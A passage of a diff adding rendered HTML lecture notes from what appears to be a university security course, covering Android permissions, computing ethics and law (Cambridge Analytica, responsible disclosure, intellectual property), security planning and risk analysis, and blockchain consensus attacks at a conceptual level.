+</ul>
+</li>
+</ul>
+<h3 id="android-permissions" >Android Permissions
+<span>
+    <a href="#android-permissions">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Linux Kernel, Framework / SDK, Applications</li>
+<li>Manifest file for permissions</li>
+<li>Prompt user for granting app permissions</li>
+<li>Runtime Permissions (aka Dangeorus Permissions)</li>
+<li>Allow additional access to restricted data</li>
+<li>Pemrission history</li>
+<li>Special Permissions
+<ul>
+<li>Allow access to senstive system resources like drawing over other apps</li>
+</ul>
+</li>
+<li>UID is always the same</li>
+<li>Process ID is different on every run</li>
+<li>Binder IPC (inter-process communication)
+<ul>
+<li>APIs in remote service objects are called as if they are local</li>
+</ul>
+</li>
+<li>Intents
+<ul>
+<li>Intents pass a messaging object from a callinga pp to another app</li>
+</ul>
+</li>
+</ul>
+<h3 id="mobile-framework-security" >Mobile Framework Security
+<span>
+    <a href="#mobile-framework-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Creating a Permission Map through Dynamic Analysis</li>
+<li>Motivation
+<ul>
+<li>Lack of understanding Android Access Control</li>
+<li>Incomplete / Missing security docs and specs</li>
+<li>Highly customized ecosystem</li>
+<li>Access control anomolies</li>
+<li>Potential vulnerabilities</li>
+</ul>
+</li>
+<li>Solution
+<ul>
+<li>API to Permission Maps</li>
+</ul>
+</li>
+<li>Dynamic Analysis uses techniques
+<ul>
+<li>Virtual environment or actual device</li>
+<li>Want to look for specific behaviours characterizing a vulnerability or a property</li>
+</ul>
+</li>
+<li>Static Analysis</li>
+<li>Invoke all APis from unpriviledged apps and detect the checks that protect them</li>
+<li>Apps do not need permission to dsiable its own component</li>
+<li>To disable another users&rsquo; app component, need permission to do that
+<ul>
+<li>Permission map
+<ul>
+<li>Need interact accross users for different user id or change related setting for different app</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Static Analysis
+<ul>
+<li>Identify entry points defined in the framework</li>
+<li>Build control flow grpah of each API</li>
+<li>Perform a reachability analysis on the cfg</li>
+<li>Identify access control enforcement methods
+<ul>
+<li>Path insentitive: union of all identified permissions</li>
+<li>Path sensitive:
+<ul>
+<li>Extracting path conditions from entry</li>
+<li>First-order logic formula by disjunction of path conditions</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="app-privacy" >App Privacy
+<span>
+    <a href="#app-privacy">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Information Leakage</li>
+<li>IMEI, GPS coordinates, SMS messages, banking information</li>
+</ul>
+<h2 id="ethics-and-laws" >Ethics and Laws
+<span>
+    <a href="#ethics-and-laws">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Laws, morality, and theifs are all beliefs, claims, rules, and norms about how we should live and behave</p>
+<h3 id="cambridge-analytica" >Cambridge Analytica
+<span>
+    <a href="#cambridge-analytica">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Facebook launched open graph in 2010
+<ul>
+<li>External developers can request access to their data and their friends&rsquo; data</li>
+</ul>
+</li>
+<li>In 2013, an app “thisisyourdigitallife” approached to almost
+300,000 users and paid them to take a psychological test.</li>
+<li>In 2014, Facebook adapted its rules to limit a developer’s access to user data, especially the friends’ data</li>
+<li>In 2015, The Guardian reported that Cambridge Analytica was
+helping Ted Cruz’s presidential campaign. FB acknowledged the data leak and argued that they have legally pressured Cambridge Analytica to remove all of the data they had improperly acquired</li>
+<li>In 2016, Cambridge Analytica was responsible for the “Defeat
+Crooked Hilary” video campaign on FB (assisting Trump’s team).</li>
+<li>Exposed in 2018 by The Guardian because of whistle blower Christopher Wylie. 50 million to 87 million users estimated  to been impacted.</li>
+<li>Slew of fines. UK UCO 2018: 500,000 pounds, FTC 2019: $5B, SEC 2019: $100M</li>
+</ul>
+<h3 id="linux-kernel-university-of-minnesota" >Linux Kernel University of Minnesota
+<span>
+    <a href="#linux-kernel-university-of-minnesota">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Intentionally adding buggy code and not informing the reviewer beforehand</li>
+</ul>
+<h3 id="what-is-law" >What is Law
+<span>
+    <a href="#what-is-law">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Formal rules governing society</li>
+<li>&ldquo;Basic&rdquo; and objectively enforceable</li>
+<li>Species with great detail what must be done and what not to do</li>
+<li>Upheld and applied by state-backed justice system</li>
+<li>Not enough:
+<ul>
+<li>lengthy legislative process does not keep up with technology</li>
+<li>very narrow focus</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/cs-489-security/canada-legislative-proces.webp" alt="Legislative prccess in Canada"></p>
+<h3 id="non-violations-of-law" >Non-Violations of Law
+<span>
+    <a href="#non-violations-of-law">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>mood manipulation study by Facebook in 2012
+<ul>
+<li>news feed was scweed by facebook scientists</li>
+<li>some people were shown content with more positive words</li>
+<li>others were shown content sadder than average</li>
+<li>Finding 1: more negative → negative status messages</li>
+<li>Finding 2: neutral content → reduction in words produced by person</li>
+</ul>
+</li>
+<li>Facebook had this in its terms and services</li>
+</ul>
+<h3 id="what-is-morality" >What is Morality
+<span>
+    <a href="#what-is-morality">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>informal framework of values, principles, beliefs, customs, ways of living</li>
+<li>social pressure</li>
+<li>an individual strongly bounded to a moral system may consider questioning the moral system as wrong</li>
+<li>unconscious formation: family, community, culture</li>
+<li>habit without explicit thinking and reasoning process</li>
+<li>rarely a moral authority agreed by every individual</li>
+</ul>
+<h3 id="ethics" >Ethics
+<span>
+    <a href="#ethics">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Branch of philosphy that answers <strong>what should I do?</strong> out of all possibilities</li>
+<li>ethical decision is a conscious
+reasoning process based on each individual’s values, principles, and purpose — do something that is good, right, and meaningful</li>
+<li>ethics is the framework to reason about issues that the laws cannot or do not address</li>
+<li>Ethics is the framework to examine a moral system to see whether the principles and rules there make sense</li>
+<li>ethical reflections shape laws and moral systems a society will develop</li>
+</ul>
+<h3 id="responsible-disclosure" >Responsible DIsclosure
+<span>
+    <a href="#responsible-disclosure">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Suppose a vulnerability is found, what should you do?</p>
+<ul>
+<li>coordinated vulnerability disclosure
+<ul>
+<li>private full disclosure to all responsible parties (e.g., software vendors for most software bugs)</li>
+</ul>
+</li>
+<li>wait for patch (90 to 120 days)</li>
+<li>public partial disclosure to pressure responsible parties</li>
+<li>public full disclosure in the interests of pontential victims</li>
+</ul>
+<h3 id="building-ethically" >Building Ethically
+<span>
+    <a href="#building-ethically">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Get as many <strong>dissenting</strong> voices as possible</li>
+<li>Explain how something works, what can go wrong, how can bad actors take advantage of non-experts</li>
+<li>privacy and data protection norms vary accross regions</li>
+<li>consult other experts</li>
+</ul>
+<h3 id="non-experts" >Non-Experts
+<span>
+    <a href="#non-experts">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>does it work as intended?</li>
+<li>who does this effect?</li>
+<li>does data need to be collected?</li>
+<li>tool not working?</li>
+<li>failure modes? abuses?</li>
+<li>who is effected?</li>
+</ul>
+<h3 id="independent-experts" >Independent Experts
+<span>
+    <a href="#independent-experts">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Insitutional review boards (IRB), independent ethics committee (iEC), ethical review boards (ERB), research ethics board (REB).</p>
+<h3 id="professional-codes" >Professional Codes
+<span>
+    <a href="#professional-codes">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Association for Computing Machinery (ACM)</li>
+<li>Institute of Electrical and Electronics Engineers (IEEE)</li>
+<li>Canadian Information Processing Society (CIPS)
+<ul>
+<li>Protect Public Interest and Maintain Integrity</li>
+<li>Demonstrate Competence and Quality of Service</li>
+<li>Maintain Confidential Information and Privacy</li>
+<li>Avoid Conflicts of Interest</li>
+<li>Uphold Responsibility to the IT Professi</li>
+</ul>
+</li>
+</ul>
+<h3 id="legal-protections" >Legal Protections
+<span>
+    <a href="#legal-protections">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>In contrast to real property, so-called “intellectual property” (IP) differs in important ways:</p>
+<ul>
+<li>It is non-depletable</li>
+<li>It is replicable</li>
+<li>It has minimal marginal cost</li>
+</ul>
+<p>Four kinds</p>
+<ul>
+<li>Trade secrets</li>
+<li>Trademarks</li>
+<li>Patents</li>
+<li>Copyright</li>
+</ul>
+<p>What?</p>
+<ul>
+<li>differnet intangible</li>
+<li>different rights</li>
+<li>different durations</li>
+<li>different registration process</li>
+</ul>
+<h3 id="trade-secrets" >Trade Secrets
+<span>
+    <a href="#trade-secrets">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>people you have to tell are not able to pass it on</li>
+</ul>
+<p>Reverse engineering</p>
+<ul>
+<li>figuring out how something works or taking it apart to figure out how it works</li>
+<li>trade secret protection is lost</li>
+<li>Kerckhoffs’s principal: do not depend on secrecy for cryptographic security. RC4 was reverse engineered in 1994</li>
+</ul>
+<h3 id="trademarks" >Trademarks
+<span>
+    <a href="#trademarks">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>names, brands, logos, domain names</li>
+<li>make a legal filing showing that you are using the name in commerce</li>
+<li>have to be renewed</li>
+</ul>
+<h3 id="patents" >Patents
+<span>
+    <a href="#patents">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>inventions including algorithms
+<ul>
+<li>Novel</li>
+<li>Useful</li>
+<li>Non-obvious</li>
+</ul>
+</li>
+<li>many cryptographic patents</li>
+</ul>
+<h3 id="copyright" >Copyright
+<span>
+    <a href="#copyright">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Protects expressions of ideas but not the ideas themselves</li>
+<li>Life + 50 in Canada, Life + 70 in USA</li>
+</ul>
+<h3 id="cyber-crime" >Cyber Crime
+<span>
+    <a href="#cyber-crime">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Bizarre rulings:
+<ul>
+<li>value of stolen data was the value of the paper it was printed on</li>
+<li>value of stolen manual was equivalent to equipment it was for</li>
+</ul>
+</li>
+<li>Computer forensics (admissibility)</li>
+<li>Cybercrime treaty
+<ul>
+<li>computer crime is often international</li>
+<li>The Council of Europe cybercrime treaty
+<ul>
+<li>&ldquo;making it easier for law enforcement to access telecommunications traffic (including voice, data, and Internet)&rdquo;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="non-technical-aspects-of-security" >Non-technical Aspects of Security
+<span>
+    <a href="#non-technical-aspects-of-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><h3 id="security-plan" >Security Plan
+<span>
+    <a href="#security-plan">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>what security goals</li>
+<li>how are they met?</li>
+<li>how they will stay met</li>
+</ul>
+<p>Seven parts</p>
+<ul>
+<li>Policy: high-level goals and priorities</li>
+<li>Current state: risk analysis, anticipation of new situations</li>
+<li>Requirements: what are the security and privacy needs</li>
+<li>Recommended controls: how to provide those needs</li>
+<li>Accountability: who is responsible for what</li>
+<li>Timetable: when the elements of the plan will be performed</li>
+<li>Continuing attention: how often the plan should be updated</li>
+</ul>
+<h3 id="developing-the-security-plan" >Developing the Security Plan
+<span>
+    <a href="#developing-the-security-plan">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Input from several constituencies</p>
+<ul>
+<li>Upper management / CTO / CIO (setting policy)</li>
+<li>IT (hardware group, sysadmins)</li>
+<li>Systems and application programmers, DB admins</li>
+<li>Data entry personnel</li>
+<li>Physical security personnel</li>
+<li>Representative users</li>
+<li>External consulting / advisory board</li>
+</ul>
+<h3 id="business-continuity-plan" >Business Continuity Plan
+<span>
+    <a href="#business-continuity-plan">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>A way out of availability situations,</p>
+<ul>
+<li>Catastrophic: a large part (or all) of a computing capability is suddenly unavailable</li>
+<li>Long duration: the outage is expected to last for so long that business would suffer if left unattended</li>
+</ul>
+<p>Need redundancy and arrange backups and training employees. What about live testing?</p>
+<h3 id="risk-analysis" >Risk Analysis
+<span>
+    <a href="#risk-analysis">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Identify assets
+<ul>
+<li>Hardware</li>
+<li>Software</li>
+<li>Data</li>
+<li>Documentation</li>
+<li>Procedures</li>
+<li>Reputation</li>
+</ul>
+</li>
+<li>Determine vulnerabilities
+<ul>
+<li>Threat modeling</li>
+<li>Think like an attacker and be very creative, even outlandish</li>
+</ul>
+</li>
+<li>Estimate likelihood of exploitation
+<ul>
+<li>acturial science</li>
+<li>what is the chance of a buffer overflow bug with arbitrary code execution? With stack canaries? with ASLR?</li>
+</ul>
+</li>
+<li>Compute risk exposure
+<ul>
+<li>legal obligations</li>
+<li>penalities</li>
+<li>harm</li>
+<li>value of keeping it away from competitors</li>
+<li>cost of delaying or out sourcing data processing when systems down</li>
+</ul>
+</li>
+<li>Survey applicable controls
+<ul>
+<li>different ways to control vulnerabilities</li>
+</ul>
+</li>
+<li>Project savings due to control
+<ul>
+<li>savings = risk exposure - cost of control - new risk exposure</li>
+<li>when savings &gt;= 0, apply control (risk averse); insurance.</li>
+</ul>
+</li>
+</ul>
+<h3 id="physical-security" >Physical Security
+<span>
+    <a href="#physical-security">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>attacker steals laptop off of desk</li>
+</ul>
+<h2 id="blockchain" >Blockchain
+<span>
+    <a href="#blockchain">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li>each block contains a hash of the previous block</li>
+<li>header: hash of previous block and hash of current block&rsquo;s payload
+<ul>
+<li>this is better because ensures authencity of the payload</li>
+</ul>
+</li>
+<li>payload: app specific info</li>
+<li>Making it harder to revert transactions:
+<ul>
+<li>Ensure that the first k bits of the header hash starts with 0. Expect 2<sup>k</sup> hash operations to find a valid N such that header is <code>HN...R</code></li>
+</ul>
+</li>
+<li>N is nonce. Need to find a nonce such that the header hash remains unchanged</li>
+<li>Deterrent: longer chains are preferred over shorter chains
+<ul>
+<li>Need hash power equal to blocks between chain head and the crucial block times 2<sup>k</sup></li>
+<li>would need to mine slower than the rest of the participants</li>
+</ul>
+</li>
+</ul>
+<h3 id="confrmation-level" >Confrmation Level
+<span>
+    <a href="#confrmation-level">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Why do we need extra blocks when there is no 51% power?</li>
+<li>Pre-mining of a block which is revealed after transaction is sent</li>
+<li>Send two transactions in a short window to trigger a fork</li>
+<li>Send two transactions to seperate haves of the network</li>
+<li>Drawbacks:
+<ul>
+<li>slow confirmation (10 minutes to confirm on bitcoin, with waiting for 6)</li>
+<li>vulnerable to 51%</li>
+<li>energy consumption since hashing doesn&rsquo;t do anything else
+<ul>
+<li>running a payment system is important though</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="proof-of-stake" >Proof of Stake
+<span>
+    <a href="#proof-of-stake">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Chance of node being elected to propose a new block is proportional to its staked value</li>
+<li>collisions not allowed, only leader creates a block</li>
+<li>If more than 50% of staked resources are controled, then attacker can prove fraudulent transactions
+<ul>
+<li>Attacker loses the weapon to future attacks, and is not easily recoverable</li>
+<li>Solution is to hard fork to invalidate fradulent transactions added by attacker</li>
+<li>social coordination is required</li>
+</ul>
+</li>
+</ul>
+<h3 id="chain-validation-nothing-at-stake" >Chain Validation (Nothing at Stake)
+<span>
+    <a href="#chain-validation-nothing-at-stake">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Attacker double spends (1% stake)</li>
